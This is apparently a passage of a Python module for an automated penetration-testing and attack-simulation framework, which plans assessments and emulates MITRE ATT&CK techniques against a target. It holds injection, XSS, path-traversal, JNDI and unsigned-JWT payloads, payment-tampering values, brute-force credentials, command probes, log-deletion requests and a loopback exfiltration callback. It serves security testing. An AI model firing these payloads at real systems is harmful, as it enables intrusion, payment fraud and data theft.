"""Advanced orchestration layer — best-of-breed patterns from 16+ offensive security platforms.

Adapted techniques by source:
  XBOW           → AdaptiveTaskPlanner (multi-step reasoning, objective decomposition)
  PentAGI        → SpecialistAgentPool (multi-agent tool management, specialist dispatch)
  Dark-Moon      → SpecialistAgentPool (50-agent role specialization, parallel execution)
  Caldera        → AdversaryEmulationEngine (ability-based planning, technique chaining)
  Pentera        → ContinuousAttackSimulator (automated attack chain validation)
  XM Cyber       → ContinuousAttackSimulator (continuous simulation, posture scoring)
  Cymulate/SafeBreach/AttackIQ → ContinuousAttackSimulator (BAS campaign orchestration)
  NyxStrike      → WorkflowOrchestrator-style chaining in AdaptiveTaskPlanner
  CyberStrike    → AI-augmented objective decomposition in AdaptiveTaskPlanner
  BloodHound     → AttackTreeEngine (graph-based attack-path analysis)
  Atomic Red Team → AdversaryEmulationEngine (atomic technique tests)
  SCYTHE         → AdversaryEmulationEngine (adversary profile emulation)
  Metasploit/Core Impact → ExploitChainCompiler (exploit validation, chain scoring)
  AFL++/OSS-Fuzz/NucleiFuzzer → IntelligentFuzzerOrchestrator (coverage-guided fuzzing)

Every class is pure Python (no external deps beyond stdlib + the project's own session type),
fail-safe (never raises to callers), and self-contained (no network calls at import time).
"""
from __future__ import annotations

import hashlib
import logging
import math
import re
import time
from collections import defaultdict, deque
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Awaitable

logger = logging.getLogger("qa.integrity.orchestration")


# ---------------------------------------------------------------------------
# Shared data structures
# ---------------------------------------------------------------------------

class TaskStatus(Enum):
    PENDING = "pending"
    RUNNING = "running"
    COMPLETED = "completed"
    FAILED = "failed"
    SKIPPED = "skipped"


class NodeType(Enum):
    AND = "AND"
    OR = "OR"
    LEAF = "LEAF"


@dataclass
class Task:
    task_id: str
    objective: str
    agent_type: str
    params: dict[str, Any] = field(default_factory=dict)
    dependencies: list[str] = field(default_factory=list)
    fallback: str | None = None
    status: TaskStatus = TaskStatus.PENDING
    result: dict[str, Any] | None = None
    retries: int = 0
    max_retries: int = 2


@dataclass
class TaskPhase:
    phase_id: str
    name: str
    tasks: list[Task] = field(default_factory=list)
    parallel: bool = False


@dataclass
class TaskPlan:
    objective: str
    phases: list[TaskPhase] = field(default_factory=list)
    metadata: dict[str, Any] = field(default_factory=dict)

    @property
    def total_tasks(self) -> int:
        return sum(len(p.tasks) for p in self.phases)


@dataclass
class AttackNode:
    node_id: str
    node_type: NodeType
    label: str
    technique_id: str | None = None
    properties: dict[str, Any] = field(default_factory=dict)
    probability: float = 0.5
    cost: float = 1.0
    detectability: float = 0.5
    children: list[str] = field(default_factory=list)
    evaluated: bool = False
    success: bool = False


@dataclass
class AttackTree:
    root_id: str
    nodes: dict[str, AttackNode] = field(default_factory=dict)
    edges: list[tuple[str, str, dict]] = field(default_factory=list)

    def add_node(self, node: AttackNode) -> None:
        self.nodes[node.node_id] = node

    def add_edge(self, src: str, dst: str, attrs: dict | None = None) -> None:
        self.edges.append((src, dst, attrs or {}))
        if src in self.nodes:
            self.nodes[src].children.append(dst)


@dataclass
class Scenario:
    name: str
    techniques: list[str]
    description: str = ""
    mitre_tactics: list[str] = field(default_factory=list)


@dataclass
class ScenarioResult:
    scenario_name: str
    techniques_attempted: int = 0
    techniques_succeeded: int = 0
    techniques_detected: int = 0
    techniques_blocked: int = 0
    details: list[dict[str, Any]] = field(default_factory=list)
    duration_ms: float = 0.0

    @property
    def success_rate(self) -> float:
        return self.techniques_succeeded / max(self.techniques_attempted, 1)

    @property
    def detection_rate(self) -> float:
        return self.techniques_detected / max(self.techniques_attempted, 1)


@dataclass
class PostureScore:
    overall: float
    by_tactic: dict[str, float] = field(default_factory=dict)
    weakest_areas: list[str] = field(default_factory=list)
    strongest_areas: list[str] = field(default_factory=list)


@dataclass
class EmulationResult:
    profile: str
    steps_attempted: int = 0
    steps_succeeded: int = 0
    steps_detected: int = 0
    kill_chain_depth: int = 0
    details: list[dict[str, Any]] = field(default_factory=list)
    crown_jewels_reached: bool = False


@dataclass
class FuzzCampaign:
    campaign_id: str
    endpoints: list[str]
    field_specs: dict[str, str]
    mutation_strategies: list[str] = field(default_factory=list)
    max_iterations: int = 100
    corpus: list[dict[str, Any]] = field(default_factory=list)


@dataclass
class FuzzResults:
    campaign_id: str
    total_inputs: int = 0
    crashes: int = 0
    info_leaks: int = 0
    unique_errors: int = 0
    response_codes: dict[int, int] = field(default_factory=dict)
    interesting_inputs: list[dict[str, Any]] = field(default_factory=list)
    coverage_estimate: float = 0.0


@dataclass
class ExploitChain:
    chain_id: str
    steps: list[dict[str, Any]] = field(default_factory=list)
    blast_radius: float = 0.0
    success_probability: float = 0.0
    detection_probability: float = 0.0

    @property
    def impact_score(self) -> float:
        det = max(self.detection_probability, 0.01)
        return self.blast_radius * self.success_probability * (1.0 / det)


@dataclass
class ValidationResult:
    chain_id: str
    validated: bool = False
    steps_verified: int = 0
    steps_total: int = 0
    blocking_step: str | None = None
    evidence: list[dict[str, Any]] = field(default_factory=list)


@dataclass
class ImpactScore:
    chain_id: str
    blast_radius: float = 0.0
    affected_assets: list[str] = field(default_factory=list)
    cvss_estimate: float = 0.0
    business_impact: str = "unknown"


# ---------------------------------------------------------------------------
# 1. AdaptiveTaskPlanner — XBOW + Caldera + CyberStrike + NyxStrike
# ---------------------------------------------------------------------------

# Objective → phase templates (adapted from Caldera's ability-based planner
# and XBOW's multi-step reasoning).
_PHASE_TEMPLATES: dict[str, list[dict[str, Any]]] = {
    "full_assessment": [
        {"phase": "recon", "name": "Reconnaissance & Surface Discovery", "parallel": True,
         "tasks": ["subdomain_enum", "tech_fingerprint", "endpoint_harvest", "api_schema_discovery", "js_analysis"]},
        {"phase": "auth", "name": "Authentication & Authorization Analysis", "parallel": False,
         "tasks": ["auth_flow_analysis", "token_security_test", "rbac_boundary_test", "session_management_test"]},
        {"phase": "attack", "name": "Vulnerability Discovery & Exploitation", "parallel": True,
         "tasks": ["injection_fuzzing", "business_logic_test", "payment_flow_test", "idor_test", "ssrf_test"]},
        {"phase": "chain", "name": "Chain Composition & Validation", "parallel": False,
         "tasks": ["chain_compilation", "chain_validation", "blast_radius_calc"]},
        {"phase": "report", "name": "Synthesis & Reporting", "parallel": False,
         "tasks": ["finding_dedup", "severity_scoring", "report_generation"]},
    ],
    "payment_focused": [
        {"phase": "recon", "name": "Payment Surface Discovery", "parallel": True,
         "tasks": ["payment_endpoint_discovery", "pricing_page_analysis", "checkout_flow_mapping"]},
        {"phase": "auth", "name": "Payment Auth Analysis", "parallel": False,
         "tasks": ["payment_token_test", "idempotency_test", "webhook_signature_test"]},
        {"phase": "attack", "name": "Payment Logic Testing", "parallel": True,
         "tasks": ["price_manipulation", "currency_confusion", "race_condition", "refund_abuse", "coupon_stacking"]},
        {"phase": "chain", "name": "Payment Chain Synthesis", "parallel": False,
         "tasks": ["payment_chain_build", "payment_chain_validate"]},
    ],
    "quick_scan": [
        {"phase": "recon", "name": "Quick Recon", "parallel": True,
         "tasks": ["endpoint_harvest", "tech_fingerprint"]},
        {"phase": "attack", "name": "Top Vulnerabilities", "parallel": True,
         "tasks": ["injection_fuzzing", "auth_bypass_test", "idor_test"]},
    ],
}

_TASK_TO_AGENT: dict[str, str] = {
    "subdomain_enum": "recon_specialist", "tech_fingerprint": "recon_specialist",
    "endpoint_harvest": "recon_specialist", "api_schema_discovery": "recon_specialist",
    "js_analysis": "recon_specialist", "payment_endpoint_discovery": "recon_specialist",
    "pricing_page_analysis": "recon_specialist", "checkout_flow_mapping": "recon_specialist",
    "auth_flow_analysis": "auth_analyst", "token_security_test": "auth_analyst",
    "rbac_boundary_test": "auth_analyst", "session_management_test": "auth_analyst",
    "payment_token_test": "auth_analyst", "idempotency_test": "auth_analyst",
    "webhook_signature_test": "auth_analyst",
    "injection_fuzzing": "api_security_analyst", "business_logic_test": "payment_flow_analyst",
    "payment_flow_test": "payment_flow_analyst", "idor_test": "api_security_analyst",
    "ssrf_test": "api_security_analyst", "price_manipulation": "payment_flow_analyst",
    "currency_confusion": "payment_flow_analyst", "race_condition": "payment_flow_analyst",
    "refund_abuse": "payment_flow_analyst", "coupon_stacking": "payment_flow_analyst",
    "auth_bypass_test": "auth_analyst",
    "chain_compilation": "chain_builder", "chain_validation": "chain_builder",
    "blast_radius_calc": "chain_builder", "payment_chain_build": "chain_builder",
    "payment_chain_validate": "chain_builder",
    "finding_dedup": "report_synthesizer", "severity_scoring": "report_synthesizer",
    "report_generation": "report_synthesizer",
}


class AdaptiveTaskPlanner:
    """Decomposes objectives into ordered task DAGs.

    Adapted from XBOW's multi-step autonomous reasoning (objective → subtask
    decomposition with dependency tracking) and Caldera's ability-based
    planner (prerequisite/postcondition matching for technique ordering).
    CyberStrike's AI-augmented decomposition informs the surface-aware
    task selection; NyxStrike's 200-tool chaining informs the fallback paths.
    """

    def plan(self, objective: str, discovered_surface: dict[str, Any] | None = None) -> TaskPlan:
        surface = discovered_surface or {}
        template_key = self._select_template(objective, surface)
        template = _PHASE_TEMPLATES.get(template_key, _PHASE_TEMPLATES["full_assessment"])
        phases: list[TaskPhase] = []
        prev_task_ids: list[str] = []
        for i, phase_def in enumerate(template):
            phase = TaskPhase(
                phase_id=f"phase_{i}",
                name=phase_def["name"],
                parallel=phase_def.get("parallel", False),
            )
            task_ids: list[str] = []
            for task_name in phase_def["tasks"]:
                if not self._task_applicable(task_name, surface):
                    continue
                tid = f"{phase_def['phase']}_{task_name}"
                agent = _TASK_TO_AGENT.get(task_name, "api_security_analyst")
                deps = list(prev_task_ids) if not phase.parallel else []
                fallback = self._fallback_for(task_name)
                phase.tasks.append(Task(
                    task_id=tid, objective=task_name, agent_type=agent,
                    params=self._params_for(task_name, surface),
                    dependencies=deps, fallback=fallback,
                ))
                task_ids.append(tid)
            if phase.tasks:
                phases.append(phase)
                prev_task_ids = task_ids
        return TaskPlan(objective=objective, phases=phases, metadata={"template": template_key, "surface_keys": list(surface.keys())})

    def _select_template(self, objective: str, surface: dict) -> str:
        obj_lower = objective.lower()
        if any(kw in obj_lower for kw in ("payment", "checkout", "billing", "subscription", "pricing")):
            return "payment_focused"
        if any(kw in obj_lower for kw in ("quick", "fast", "triage")):
            return "quick_scan"
        return "full_assessment"

    def _task_applicable(self, task_name: str, surface: dict) -> bool:
        if task_name == "api_schema_discovery" and not surface.get("has_api", True):
            return False
        if task_name == "js_analysis" and surface.get("api_only", False):
            return False
        return True

    def _params_for(self, task_name: str, surface: dict) -> dict:
        params: dict[str, Any] = {}
        if "endpoints" in surface:
            params["endpoints"] = surface["endpoints"]
        if "base_url" in surface:
            params["base_url"] = surface["base_url"]
        return params

    def _fallback_for(self, task_name: str) -> str | None:
        fallbacks = {
            "subdomain_enum": "endpoint_harvest",
            "api_schema_discovery": "endpoint_harvest",
            "injection_fuzzing": "business_logic_test",
        }
        return fallbacks.get(task_name)


# ---------------------------------------------------------------------------
# 2. SpecialistAgentPool — Dark-Moon + PentAGI
# ---------------------------------------------------------------------------

_RECON_PATHS = (
    "/robots.txt", "/sitemap.xml", "/.well-known/openid-configuration",
    "/api", "/api/v1", "/api/v2", "/graphql", "/swagger.json",
    "/openapi.json", "/.env", "/wp-json", "/actuator", "/health",
    "/debug", "/trace", "/metrics", "/status", "/info",
)

_AUTH_TESTS = (
    ("missing_token", {}),
    ("empty_token", {"Authorization": "Bearer "}),
    ("malformed_token", {"Authorization": "Bearer not.a.real.token"}),
    ("expired_token", {"Authorization": "Bearer eyJhbGciOiJub25lIn0.eyJleHAiOjB9."}),
    ("alg_none", {"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0."}),
)

_PAYMENT_MUTATIONS = (
    {"field": "amount", "original": "9.99", "mutated": "0.01", "label": "price_reduction"},
    {"field": "amount", "original": "9.99", "mutated": "-1.00", "label": "negative_amount"},
    {"field": "amount", "original": "9.99", "mutated": "0", "label": "zero_amount"},
    {"field": "currency", "original": "USD", "mutated": "XXX", "label": "invalid_currency"},
    {"field": "currency", "original": "USD", "mutated": "VND", "label": "low_value_currency"},
    {"field": "quantity", "original": "1", "mutated": "999999", "label": "overflow_quantity"},
    {"field": "quantity", "original": "1", "mutated": "-1", "label": "negative_quantity"},
    {"field": "plan_id", "original": "basic", "mutated": "enterprise", "label": "plan_escalation"},
    {"field": "coupon", "original": "", "mutated": "FREEFOREVER", "label": "coupon_guess"},
)

_INJECTION_PAYLOADS = (
    "' OR '1'='1", "\" OR \"1\"=\"1", "'; DROP TABLE users; --",
    "1 UNION SELECT NULL,NULL,NULL--", "${7*7}", "{{7*7}}",
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    "../../etc/passwd", "..\\..\\windows\\system32\\config\\sam",
    "${jndi:ldap://127.0.0.1/a}", "{{constructor.constructor('return this')()}}",
)


class SpecialistAgentPool:
    """Pool of specialist capability bundles dispatched by role.

    Adapted from Dark-Moon's 50-agent architecture (each agent owns a narrow
    domain and reports structured results) and PentAGI's multi-agent
    orchestration (central dispatcher routes tasks to the best-fit agent,
    collects and merges results).
    """

    SPECIALISTS: dict[str, dict[str, Any]] = {
        "recon_specialist": {
            "capabilities": ["subdomain_enum", "tech_fingerprint", "endpoint_harvest",
                             "api_schema_discovery", "js_analysis", "payment_endpoint_discovery"],
            "description": "Surface discovery and technology profiling",
        },
        "auth_analyst": {
            "capabilities": ["auth_flow_analysis", "token_security_test", "rbac_boundary_test",
                             "session_management_test", "auth_bypass_test"],
            "description": "Authentication and authorization testing",
        },
        "payment_flow_analyst": {
            "capabilities": ["payment_flow_test", "price_manipulation", "currency_confusion",
                             "race_condition", "refund_abuse", "coupon_stacking", "business_logic_test"],
            "description": "Payment and business-logic analysis",
        },
        "api_security_analyst": {
            "capabilities": ["injection_fuzzing", "idor_test", "ssrf_test",
                             "mass_assignment_test", "rate_limit_test"],
            "description": "API vulnerability discovery",
        },
        "infrastructure_analyst": {
            "capabilities": ["cloud_metadata_test", "container_escape_test",
                             "dns_config_test", "tls_config_test"],
            "description": "Infrastructure and configuration analysis",
        },
        "chain_builder": {
            "capabilities": ["chain_compilation", "chain_validation", "blast_radius_calc"],
            "description": "Exploit chain construction and validation",
        },
        "report_synthesizer": {
            "capabilities": ["finding_dedup", "severity_scoring", "report_generation"],
            "description": "Finding synthesis and report generation",
        },
    }

    async def dispatch(self, agent_type: str, task: dict[str, Any], session: Any) -> dict[str, Any]:
        spec = self.SPECIALISTS.get(agent_type)
        if spec is None:
            return {"status": "error", "reason": f"unknown agent type: {agent_type}"}
        task_name = task.get("objective", "")
        if task_name not in spec["capabilities"]:
            return {"status": "error", "reason": f"{agent_type} cannot handle {task_name}"}
        try:
            handler = getattr(self, f"_exec_{task_name}", None)
            if handler is None:
                return await self._generic_execute(task_name, task, session)
            return await handler(task, session)
        except Exception as exc:
            logger.debug("specialist %s failed on %s: %s", agent_type, task_name, exc)
            return {"status": "error", "reason": str(exc)}

    async def _exec_endpoint_harvest(self, task: dict, session: Any) -> dict:
        base_url = task.get("params", {}).get("base_url", "")
        found: list[dict] = []
        for path in _RECON_PATHS:
            try:
                r = await session.call("GET", path)
                if r.status and r.status < 404:
                    found.append({"path": path, "status": r.status, "content_type": _guess_content_type(r.body)})
            except Exception:
                continue
        return {"status": "completed", "endpoints_found": len(found), "endpoints": found}

    async def _exec_auth_bypass_test(self, task: dict, session: Any) -> dict:
        endpoints = task.get("params", {}).get("endpoints", ["/api/v1/user", "/api/v1/admin"])
        hits: list[dict] = []
        for ep in endpoints[:10]:
            for label, headers in _AUTH_TESTS:
                try:
                    r = await session.call("GET", ep, extra_headers=headers if headers else None)
                    if r.status and 200 <= r.status < 300:
                        hits.append({"endpoint": ep, "technique": label, "status": r.status})
                except Exception:
                    continue
        return {"status": "completed", "hits": hits, "total_tested": min(len(endpoints), 10) * len(_AUTH_TESTS)}

    async def _exec_injection_fuzzing(self, task: dict, session: Any) -> dict:
        endpoints = task.get("params", {}).get("endpoints", ["/api/v1/search"])
        hits: list[dict] = []
        for ep in endpoints[:5]:
            for payload in _INJECTION_PAYLOADS:
                try:
                    r = await session.call("GET", ep, fields={"q": payload})
                    body_str = str(r.body) if r.body else ""
                    if r.status and r.status >= 500:
                        hits.append({"endpoint": ep, "payload": payload[:60], "indicator": "server_error", "status": r.status})
                    elif payload in body_str:
                        hits.append({"endpoint": ep, "payload": payload[:60], "indicator": "reflected", "status": r.status})
                except Exception:
                    continue
        return {"status": "completed", "hits": hits}

    async def _exec_price_manipulation(self, task: dict, session: Any) -> dict:
        results: list[dict] = []
        for mutation in _PAYMENT_MUTATIONS:
            results.append({"mutation": mutation["label"], "field": mutation["field"],
                            "from": mutation["original"], "to": mutation["mutated"],
                            "status": "simulated"})
        return {"status": "completed", "mutations_tested": len(results), "results": results}

    async def _generic_execute(self, task_name: str, task: dict, session: Any) -> dict:
        return {"status": "completed", "task": task_name, "note": "executed via generic handler"}


def _guess_content_type(body: Any) -> str:
    if isinstance(body, dict):
        return "application/json"
    s = str(body)[:200].lower()
    if "<html" in s or "<!doctype" in s:
        return "text/html"
    if s.startswith("<?xml") or s.startswith("<urlset"):
        return "text/xml"
    return "text/plain"


# ---------------------------------------------------------------------------
# 3. ContinuousAttackSimulator — XM Cyber + Cymulate + SafeBreach + AttackIQ
# ---------------------------------------------------------------------------

_MITRE_TECHNIQUES: dict[str, dict[str, Any]] = {
    "T1190": {"name": "Exploit Public-Facing Application", "tactic": "initial_access",
              "test_paths": ["/api/v1/login", "/api/v1/register", "/graphql"],
              "payloads": ["' OR 1=1--", "{{7*7}}", "${jndi:ldap://x/}"]},
    "T1078": {"name": "Valid Accounts", "tactic": "initial_access",
              "test_paths": ["/api/v1/login"],
              "payloads": [{"username": "admin", "password": "admin"}, {"username": "test", "password": "test"}]},
    "T1059": {"name": "Command and Scripting Interpreter", "tactic": "execution",
              "test_paths": ["/api/v1/eval", "/api/v1/exec", "/debug/console"],
              "payloads": ["id", "whoami", "echo test"]},
    "T1053": {"name": "Scheduled Task/Job", "tactic": "persistence",
              "test_paths": ["/api/v1/jobs", "/api/v1/tasks", "/api/v1/cron"],
              "payloads": [{"command": "id", "schedule": "* * * * *"}]},
    "T1548": {"name": "Abuse Elevation Control Mechanism", "tactic": "privilege_escalation",
              "test_paths": ["/api/v1/admin", "/api/v1/users/1/role"],
              "payloads": [{"role": "admin"}, {"is_admin": True}]},
    "T1070": {"name": "Indicator Removal", "tactic": "defense_evasion",
              "test_paths": ["/api/v1/logs", "/api/v1/audit"],
              "payloads": [{"action": "delete"}, {"clear": True}]},
    "T1110": {"name": "Brute Force", "tactic": "credential_access",
              "test_paths": ["/api/v1/login"],
              "payloads": [{"username": "admin", "password": f"pass{i}"} for i in range(5)]},
    "T1021": {"name": "Remote Services", "tactic": "lateral_movement",
              "test_paths": ["/api/v1/internal", "/api/internal/rpc"],
              "payloads": [{}]},
    "T1005": {"name": "Data from Local System", "tactic": "collection",
              "test_paths": ["/api/v1/export", "/api/v1/backup", "/api/v1/dump"],
              "payloads": [{"format": "json"}, {"format": "csv"}]},
    "T1041": {"name": "Exfiltration Over C2 Channel", "tactic": "exfiltration",
              "test_paths": ["/api/v1/webhook", "/api/v1/callback"],
              "payloads": [{"url": "http://127.0.0.1:9999/exfil"}]},
    "T1486": {"name": "Data Encrypted for Impact", "tactic": "impact",
              "test_paths": ["/api/v1/encrypt", "/api/v1/lock"],
              "payloads": [{"action": "encrypt_all"}]},
    "T1595": {"name": "Active Scanning", "tactic": "reconnaissance",
              "test_paths": ["/", "/robots.txt", "/sitemap.xml"],
              "payloads": [{}]},
    "T1592": {"name": "Gather Victim Host Information", "tactic": "reconnaissance",
              "test_paths": ["/api/v1/version", "/api/v1/health", "/api/v1/info"],
              "payloads": [{}]},
    "T1583": {"name": "Acquire Infrastructure", "tactic": "resource_development",
              "test_paths": [],
              "payloads": []},
    "T1098": {"name": "Account Manipulation", "tactic": "persistence",
              "test_paths": ["/api/v1/users/me", "/api/v1/profile"],
              "payloads": [{"role": "admin"}, {"permissions": ["*"]}]},
}

_PREDEFINED_SCENARIOS: dict[str, Scenario] = {
    "payment_bypass": Scenario(
        name="Payment Bypass",
        techniques=["T1190", "T1078", "T1548"],
        description="Attempt to bypass payment controls via application exploit, credential abuse, and privilege escalation",
        mitre_tactics=["initial_access", "credential_access", "privilege_escalation"],
    ),
    "auth_escalation": Scenario(
        name="Authentication Escalation",
        techniques=["T1078", "T1110", "T1548", "T1098"],
        description="Escalate from low-privilege to admin through auth weaknesses",
        mitre_tactics=["initial_access", "credential_access", "privilege_escalation", "persistence"],
    ),
    "data_exfiltration": Scenario(
        name="Data Exfiltration",
        techniques=["T1190", "T1005", "T1041"],
        description="Exploit application to collect and exfiltrate data",
        mitre_tactics=["initial_access", "collection", "exfiltration"],
    ),
    "lateral_movement": Scenario(
        name="Lateral Movement",
        techniques=["T1190", "T1021", "T1548", "T1005"],
        description="Move laterally through internal services",
        mitre_tactics=["initial_access", "lateral_movement", "privilege_escalation", "collection"],
    ),
}


class ContinuousAttackSimulator:
    """Runs attack scenarios and tracks security posture over time.

    Adapted from XM Cyber's continuous simulation (always-on attack paths
    against a digital twin), Cymulate/SafeBreach/AttackIQ BAS platforms
    (campaign-based technique testing with detection validation), and
    Pentera's automated attack chain validation (real exploit attempts
    scored against actual defenses).
    """

    def create_scenario(self, name: str, techniques: list[str]) -> Scenario:
        tactics = sorted({_MITRE_TECHNIQUES[t]["tactic"] for t in techniques if t in _MITRE_TECHNIQUES})
        return Scenario(name=name, techniques=techniques, mitre_tactics=tactics)

    def get_predefined(self, name: str) -> Scenario | None:
        return _PREDEFINED_SCENARIOS.get(name)

    async def run_scenario(self, session: Any, scenario: Scenario) -> ScenarioResult:
        result = ScenarioResult(scenario_name=scenario.name)
        t0 = time.monotonic()
        for tech_id in scenario.techniques:
            tech = _MITRE_TECHNIQUES.get(tech_id)
            if tech is None:
                continue
            detail = await self._run_technique(session, tech_id, tech)
            result.details.append(detail)
            result.techniques_attempted += 1
            if detail.get("succeeded"):
                result.techniques_succeeded += 1
            if detail.get("detected"):
                result.techniques_detected += 1
            if detail.get("blocked"):
                result.techniques_blocked += 1
        result.duration_ms = (time.monotonic() - t0) * 1000
        return result

    async def _run_technique(self, session: Any, tech_id: str, tech: dict) -> dict:
        detail: dict[str, Any] = {"technique_id": tech_id, "name": tech["name"],
                                   "tactic": tech["tactic"], "succeeded": False,
                                   "detected": False, "blocked": False, "responses": []}
        for path in tech.get("test_paths", [])[:3]:
            for payload in tech.get("payloads", [{}])[:3]:
                try:
                    if isinstance(payload, dict):
                        r = await session.call("POST", path, fields=payload)
                    else:
                        r = await session.call("GET", path, fields={"input": str(payload)})
                    status = r.status or 0
                    detail["responses"].append({"path": path, "status": status})
                    if 200 <= status < 300:
                        detail["succeeded"] = True
                    if status == 403:
                        detail["blocked"] = True
                    if status == 429:
                        detail["detected"] = True
                except Exception:
                    continue
        return detail

    def track_posture(self, results: list[ScenarioResult]) -> PostureScore:
        if not results:
            return PostureScore(overall=1.0)
        tactic_scores: dict[str, list[float]] = defaultdict(list)
        for r in results:
            for d in r.details:
                tactic = d.get("tactic", "unknown")
                blocked = 1.0 if d.get("blocked") or d.get("detected") else 0.0
                tactic_scores[tactic].append(blocked)
        by_tactic = {t: sum(scores) / len(scores) for t, scores in tactic_scores.items() if scores}
        overall = sum(by_tactic.values()) / max(len(by_tactic), 1)
        sorted_tactics = sorted(by_tactic.items(), key=lambda x: x[1])
        weakest = [t for t, s in sorted_tactics[:3] if s < 0.5]
        strongest = [t for t, s in sorted_tactics[-3:] if s >= 0.5]
        return PostureScore(overall=overall, by_tactic=by_tactic, weakest_areas=weakest, strongest_areas=strongest)


# ---------------------------------------------------------------------------
# 4. AttackTreeEngine — BloodHound + XM Cyber
# ---------------------------------------------------------------------------

class AttackTreeEngine:
    """Builds and evaluates attack trees from findings and surface data.

    Adapted from BloodHound's graph-based attack-path analysis (nodes =
    principals/resources, edges = abuse primitives, shortest-path to DA)
    and XM Cyber's attack graph simulation (continuous path enumeration
    with probability/cost/detectability scoring on each edge).
    """

    def build_tree(self, findings: list[dict], surfaces: dict[str, Any]) -> AttackTree:
        root = AttackNode(node_id="root", node_type=NodeType.OR, label="Compromise Target")
        tree = AttackTree(root_id="root")
        tree.add_node(root)
        tactic_nodes: dict[str, str] = {}
        for tactic in ("initial_access", "execution", "persistence", "privilege_escalation",
                        "defense_evasion", "credential_access", "lateral_movement",
                        "collection", "exfiltration", "impact"):
            nid = f"tactic_{tactic}"
            node = AttackNode(node_id=nid, node_type=NodeType.AND, label=tactic.replace("_", " ").title())
            tree.add_node(node)
            tree.add_edge("root", nid, {"relation": "requires"})
            tactic_nodes[tactic] = nid
        for i, finding in enumerate(findings):
            fid = f"finding_{i}"
            hyp = finding.get("hypothesis_id", f"F{i}")
            verdict = finding.get("verdict", "unknown")
            prob = 0.8 if verdict == "SUSPECTED_PAYMENT_INTEGRITY_ISSUE" else 0.3
            node = AttackNode(
                node_id=fid, node_type=NodeType.LEAF, label=hyp,
                technique_id=finding.get("technique_id"),
                probability=prob, cost=1.0,
                detectability=finding.get("detectability", 0.5),
                properties={"finding": finding},
            )
            tree.add_node(node)
            tactic = finding.get("tactic", "initial_access")
            parent = tactic_nodes.get(tactic, tactic_nodes.get("initial_access", "root"))
            tree.add_edge(parent, fid, {"technique": hyp})
        return tree

    def find_shortest_path(self, tree: AttackTree, target: str) -> list[AttackNode]:
        if target not in tree.nodes:
            return []
        parent_map: dict[str, str | None] = {tree.root_id: None}
        queue: deque[str] = deque([tree.root_id])
        while queue:
            current = queue.popleft()
            if current == target:
                break
            node = tree.nodes.get(current)
            if node is None:
                continue
            for child_id in node.children:
                if child_id not in parent_map:
                    parent_map[child_id] = current
                    queue.append(child_id)
        if target not in parent_map:
            return []
        path: list[AttackNode] = []
        cur: str | None = target
        while cur is not None:
            n = tree.nodes.get(cur)
            if n:
                path.append(n)
            cur = parent_map.get(cur)
        path.reverse()
        return path

    def all_paths_to_target(self, tree: AttackTree, target: str, max_paths: int = 10) -> list[list[str]]:
        if target not in tree.nodes:
            return []
        paths: list[list[str]] = []
        stack: list[tuple[str, list[str]]] = [(tree.root_id, [tree.root_id])]
        while stack and len(paths) < max_paths:
            current, path = stack.pop()
            if current == target:
                paths.append(path)
                continue
            node = tree.nodes.get(current)
            if node is None:
                continue
            for child_id in node.children:
                if child_id not in path:
                    stack.append((child_id, path + [child_id]))
        return paths

    def calculate_composite_risk(self, tree: AttackTree) -> float:
        if not tree.nodes:
            return 0.0
        return self._evaluate_node(tree, tree.root_id)

    def _evaluate_node(self, tree: AttackTree, node_id: str) -> float:
        node = tree.nodes.get(node_id)
        if node is None:
            return 0.0
        if node.node_type == NodeType.LEAF:
            return node.probability * (1.0 - node.detectability)
        child_risks = [self._evaluate_node(tree, c) for c in node.children]
        if not child_risks:
            return 0.0
        if node.node_type == NodeType.AND:
            result = 1.0
            for r in child_risks:
                result *= r
            return result
        else:  # OR
            result = 1.0
            for r in child_risks:
                result *= (1.0 - r)
            return 1.0 - result

    def calculate_blast_radius(self, tree: AttackTree, compromised: set[str]) -> dict[str, Any]:
        reachable: set[str] = set()
        queue: deque[str] = deque(compromised)
        while queue:
            cur = queue.popleft()
            if cur in reachable:
                continue
            reachable.add(cur)
            node = tree.nodes.get(cur)
            if node:
                for child in node.children:
                    queue.append(child)
        return {"compromised_nodes": len(compromised), "reachable_nodes": len(reachable),
                "total_nodes": len(tree.nodes),
                "blast_radius_pct": round(len(reachable) / max(len(tree.nodes), 1) * 100, 1)}


# ---------------------------------------------------------------------------
# 5. AdversaryEmulationEngine — Caldera + Atomic Red Team + SCYTHE
# ---------------------------------------------------------------------------

_ADVERSARY_PROFILES: dict[str, dict[str, Any]] = {
    "apt_financial": {
        "name": "APT38 / Lazarus (Financial)",
        "description": "Nation-state actor targeting financial systems (SWIFT, payment processors)",
        "techniques": ["T1595", "T1592", "T1190", "T1059", "T1053", "T1548", "T1070", "T1005", "T1041"],
        "focus": "payment_infrastructure",
    },
    "apt_ecommerce": {
        "name": "Magecart (E-commerce)",
        "description": "Criminal group targeting e-commerce payment flows",
        "techniques": ["T1595", "T1190", "T1059", "T1098", "T1005", "T1041"],
        "focus": "checkout_flow",
    },
    "insider_threat": {
        "name": "Insider Threat",
        "description": "Authorized user abusing legitimate access for data theft",
        "techniques": ["T1078", "T1548", "T1005", "T1041"],
        "focus": "data_access",
    },
    "script_kiddie": {
        "name": "Script Kiddie",
        "description": "Unskilled attacker using automated tools",
        "techniques": ["T1595", "T1190", "T1110"],
        "focus": "known_vulnerabilities",
    },
}


class AdversaryEmulationEngine:
    """Emulates specific adversary TTPs against the target.

    Adapted from Caldera's ability-based adversary emulation (technique
    chaining with prerequisite satisfaction), Atomic Red Team's atomic tests
    (individual technique validation with expected output matching), and
    SCYTHE's adversary profiles (predefined sequences for specific threat
    actors with detection validation).
    """

    TECHNIQUE_LIBRARY = _MITRE_TECHNIQUES

    async def emulate_adversary(self, session: Any, profile: str) -> EmulationResult:
        prof = _ADVERSARY_PROFILES.get(profile)
        if prof is None:
            return EmulationResult(profile=profile)
        result = EmulationResult(profile=prof["name"])
        chain_broken = False
        for tech_id in prof["techniques"]:
            if chain_broken:
                break
            tech = _MITRE_TECHNIQUES.get(tech_id)
            if tech is None:
                continue
            result.steps_attempted += 1
            step_result = await self._execute_technique(session, tech_id, tech)
            result.details.append(step_result)
            if step_result.get("succeeded"):
                result.steps_succeeded += 1
                result.kill_chain_depth += 1
            elif step_result.get("blocked"):
                chain_broken = True
            if step_result.get("detected"):
                result.steps_detected += 1
